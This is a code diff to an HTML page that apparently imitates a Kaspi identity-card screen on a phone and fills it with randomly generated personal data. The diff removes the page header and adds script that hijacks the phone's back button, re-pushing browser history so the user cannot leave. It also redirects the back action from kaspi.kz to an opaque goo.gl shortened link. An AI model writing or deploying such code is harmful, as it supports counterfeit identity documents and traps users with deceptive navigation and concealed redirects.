@@ -37,43 +37,9 @@
             overflow: hidden;
         }
 
-        .header {
-            display: flex;
-            align-items: center;
-            padding: 16px;
-            border-bottom: 1px solid #f0f0f0;
-        }
-
-        .back-btn {
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .back-btn svg {
-            width: 24px;
-            height: 24px;
-            stroke: #d32f2f;
-            stroke-width: 2;
-            fill: none;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-        }
-
-        .header-title {
-            flex-grow: 1;
-            text-align: center;
-            font-size: 18px;
-            font-weight: 500;
-            margin-right: 40px;
-        }
-
+        /* Хедер полностью удален, табы теперь сверху */
         .tabs-container {
-            padding: 12px 16px;
+            padding: 16px 16px 12px 16px;
         }
 
         .tabs {
@@ -198,7 +164,6 @@
             width: 100%;
             padding: 6px 0;
             border: none;
-            border-bottom: none;
             border-radius: 0;
             font-size: 16px;
             outline: none;
@@ -360,15 +325,6 @@
 <body>
 
     <div class="phone-container">
-        <header class="header">
-            <button class="back-btn" onclick="goBack()" aria-label="Назад">
-                <svg viewBox="0 0 24 24">
-                    <polyline points="15 18 9 12 15 6"></polyline>
-                </svg>
-            </button>
-            <h1 class="header-title">Удостоверение личности</h1>
-        </header>
-
         <div class="tabs-container">
             <div class="tabs" id="tabs-switch">
                 <div class="slider"></div>
@@ -496,8 +452,16 @@
 
         generateRandomData("Пользователь");
 
+        // Перехват системной кнопки "Назад" на телефоне
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            goBack();
+            // Возвращаем состояние назад, чтобы повторные клики тоже перехватывались
+            history.pushState(null, null, location.href);
+        };
+
         function goBack() {
-            window.location.href = "https://kaspi.kz";
+            window.location.href = "https://dz3a4.app.goo.gl/pVzn";
         }
 
         function switchTab(tabName) {
